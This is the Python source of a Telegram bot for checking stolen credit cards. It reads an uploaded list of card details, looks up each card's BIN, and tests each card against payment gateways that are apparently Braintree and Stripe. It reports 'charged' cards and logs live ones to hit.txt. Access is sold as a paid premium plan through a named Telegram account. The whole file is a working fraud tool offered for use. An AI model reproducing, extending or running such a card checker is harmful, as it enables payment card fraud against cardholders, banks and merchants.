import requests, re
from hh import keep_alive
import telebot
import os
os.system("pip install pyTelegramBotAPI")
from telebot import *
from GATEAU import Tele
from colorama import Fore
from config import Config

allowed_ids = Config.allowed_ids
sto = {"stop": True}
api_hash = Config.API_HASH
token = Config.BOT_TOKEN
bot = telebot.TeleBot(token, parse_mode="HTML")

@bot.message_handler(commands=["stop"])
def start(message):
  sto.update({"stop": True})
  bot.reply_to(message,
               '𝖄𝖊𝖆𝖍 𝖘𝖎𝖗 𝕴𝖆𝖒 𝖘𝖙𝖔𝖕𝖕𝖎𝖓𝖌 𝖄𝖔𝖚𝖗 𝖈𝖔𝖒𝖇𝖔𝖘 𝖓𝖔𝖜 𝖏𝖚𝖘𝖙 𝖆 𝖘𝖊𝖈✌')


@bot.message_handler(commands=["start"])
def start(message):
  bot.send_message(message.chat.id,
                   "   ʏɛǟɦ օӄ ֆɨʀ ... ɨǟʍ ɮօօȶɨռɢ ʍʏֆɛʟʄ  ʄօʀ ʏօʊ ȶօ ƈɦɛƈӄ ʏօʊʀ ƈօʍɮօֆ ǟռɖ ֆɛռȶ ȶօ ʏօʊ ɨռ ǟ ƈօʊքʟɛ օʄ ʍɨռʊȶɛֆ😁".format(
                       message.chat.first_name),
                   reply_markup=telebot.types.InlineKeyboardMarkup())


@bot.message_handler(content_types=["document"])
def main(message):
  first_name = message.from_user.first_name
  name = f"{first_name} "
  risk = 0
  bad = 0
  nok = 0
  ok = 0
  ko = (bot.reply_to(
      message,
      f" WELCOME {name}  ȶɦǟռӄֆ ʄօʀ ֆȶǟʀȶɨռɢ ʍɛ... ռօա ɨǟʍ ƈɦɛƈӄɨռɢ ʏօʊʀ ƈօʍɮօֆ ȶɨʟʟ ȶɦɛռ ʊ ƈǟռ ɢօ ǟռɖ ֆɛɛ ֆօʍɛ ռǟʊɢɦȶʏ ʋɨɖɛօֆ😉 ").message_id)
  ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
  with open("combo.txt", "wb") as w:
    w.write(ee)
  print(message.chat.id)
  sto.update({"stop": True})
  if message.chat.id in allowed_ids:
    with open("combo.txt") as file:
      lino = file.readlines()
      lino = [line.rstrip() for line in lino]
      total = len(lino)
      for cc in lino:
        if sto["stop"] == True:
          pass
        else:
          break
        bin = cc[:6]
        url = f"https://lookup.binlist.net/{bin}"
        try:
          req = requests.get(url).json()
        except:
          pass
        try:
          inf = req['scheme']
        except:
          inf = "------------"
        try:
          type = req['type']
        except:
          type = "-----------"
        try:
          brand = req['brand']
        except:
          brand = '-----'
        try:
          info = inf + '-' + type + '-' + brand
        except:
          info = "CREDIT-CORPORATE"
        try:
          ii = info.upper()
        except:
          ii = "----------"
        try:
          bank = req['bank']['name'].upper()
        except:
          bank = "CAPITAL ONE"
        try:
          do = req['country']['name'] + ' ' + req['country']['emoji'].upper()
        except:
          do = "-----------"
        mes = types.InlineKeyboardMarkup(row_width=1)
        GALD1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
        ##GALD2 = types.InlineKeyboardButton(f"• {cc} •",callback_data='u1')
        GALD3 = types.InlineKeyboardButton(f"• CHARGE ✔ : [ {ok} ] •",
                                           callback_data='u2')
        GALD4 = types.InlineKeyboardButton(f"• DECLINE 🐱‍👤  : [ {bad} ] •",
                                           callback_data='u1')
        risk6 = types.InlineKeyboardButton(f"• DO NOT HONOR 🙌  : [ {risk} ] •",
                                           callback_data='u1')
        GALD5 = types.InlineKeyboardButton(f"• COMBINE  😎 : [ {total} ] •",
                                           callback_data='u1')
        mes.add(GALD1, GALD3, GALD4, risk6, GALD5)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=ko,
            text=f''' 𓆩 σн.. уσυ'яє ρяємιυм υѕєя..  {name}, ωєℓ¢σмє ѕιя ησω  ιαм ѕєαя¢нιηg уσυя ¢σмвσѕ αη∂ ѕєηт тσ уσυ  α ¢нαяgє ¢яє∂ιт ¢αя∂🌹
    ''',
            parse_mode='markdown',
            reply_markup=mes)

        try:
          last = str(Tele(cc))
        except Exception as e:
          print(e)
          try:
            last = str(Tele(cc))
          except Exception as e:
            print(e)
            bot.reply_to(message, f"ֆօʀʀʏ ֆɨʀ ʏօʊʀ ƈǟʀɖ ɨֆ ɖɛƈʟɨռɛɖ ȶɦǟȶ'ֆ աɦʏ ɨǟʍ ֆӄɨքքɨռɢ ȶɦɨֆ ǟռɖ ʝʊֆȶ ƈɦɛƈӄ ȶɦɛ ƈօʍɮօֆ ǟɢǟɨռ😢 {cc}")
        if "risk" in last:
          risk += 1
          print(Fore.YELLOW + cc + "->" + Fore.CYAN + last)
        elif "Insufficient Funds" in last:
          ok += 1
          respo = f'''
¢нαяgє∂ ✅¢нαяgє∂ ✅
──────────────────
[↯] 𝗖𝗖 ★ {cc}
[↯] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ★ 𓆩𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞𓆪ꪾ, Strip𝐞 𝙰𝚞𝚝𝚑
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <Charg𝐞dꪜ 
──────────────────
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {ii}
[↯] 𝗕𝗮𝗻𝗸: {bank}
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {do}
──────────────────

[↯] 𝗕𝗢𝗧 𝗕𝗬: KRISHNA 
[↯] 𝗣𝗥𝗢𝗫𝗬 : 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
──────────────────
'''
          print(Fore.YELLOW + cc + "->" + Fore.GREEN + last)
          bot.reply_to(message, respo)
          with open("hit.txt", "a") as f:
            f.write(f'''
±++++++++++++++++++++++++++++
¢нαяgє∂ ✅
──────────────────
[↯] 𝗖𝗖 ★ {cc}
[↯] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ★ 𓆩𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞𓆪ꪾ Strip𝐞 𝙰𝚞𝚝𝚑
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ ¢нαяgє∂ꪜ 
──────────────────
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {ii}
[↯] 𝗕𝗮𝗻𝗸: {bank}
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {do}
──────────────────

[↯] 𝗕𝗢𝗧 𝗕𝗬: KRISHNA
[↯] 𝗣𝗥𝗢𝗫𝗬 : 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
──────────────────''')
        elif "Status code avs: Gateway Rejected: avs" in last or "Nice! New payment method added:" in last or "Status code 81724: Duplicate card exists in the vault." in last:
          ok += 1
          respo = (f'''
━━━━[🌹¢нαяgє∂ ✅🌹]━━━━
<a >━━━━━━━━━━━━━━━━━━</a>
<a >[↯]</a> 𝗖𝗖 ★ <code>{cc}</code>
<a >[↯]</a> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ★ 𓆩𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞𓆪ꪾ Strip𝐞 𝙰𝚞𝚝𝚑
<a >[↯]</a> 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ ¢нαяgє∂ꪜ
<a >━━━━━━━━━━━━━━━━━━</a>
<a >[↯]</a> 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯ <code>{ii}</code>
<a >[↯]</a> 𝗕𝗮𝗻𝗸 ↯ <code>{bank}</code>
<a >[↯]</a> 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>{do}</code>
<a >━━━━━━━━━━━━━━━━━━</a>
<a >[↯]</a> 𝗕𝗢𝗧 𝗕𝗬 ↯ <a href='t.me/Itsz_Krish_Babess'>KRISHNA</a>
<a >[↯]</a> 𝗣𝗥𝗢𝗫𝗬  ↯ <code>𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]</code>
<a >━━━━━━━━━━━━━━━━━━</a>''')
          print(Fore.YELLOW + cc + "->" + Fore.GREEN + last)
          bot.reply_to(message, respo)
          with open("hit.txt", "a") as f:
            f.write(f'''
¢нαяgє∂ ✅
──────────────────
[↯] 𝗖𝗖 ★ {cc}
[↯] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ★ 𓆩𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞𓆪ꪾ Strip𝐞 𝙰𝚞𝚝𝚑
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>¢нαяgє∂ꪜ 
──────────────────
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {ii}
[↯] 𝗕𝗮𝗻𝗸: {bank}
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {do}
──────────────────
[↯] 𝗕𝗢𝗧 𝗕𝗬: KRISHNA
[↯] 𝗣𝗥𝗢𝗫𝗬 : 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
──────────────────''')
        else:
          bad += 1
          print(Fore.YELLOW + cc + "->" + Fore.RED + last)
      if sto["stop"] == True:
        bot.reply_to(message, 'X')
  else:
    bot.reply_to(
        message,
        "σнн.. ѕσяяу ѕιя уσυ αяє ησт α ρяємιυм υѕєя ρℓєαѕє gєт ιт ƒяσм @Itsz_Krish_Babess 😉😁  \n paid premium plan  \n Buy This")


keep_alive()
print("STARTED BOT @CYPHIC_MAIN_CHANNEL")
bot.infinity_polling()

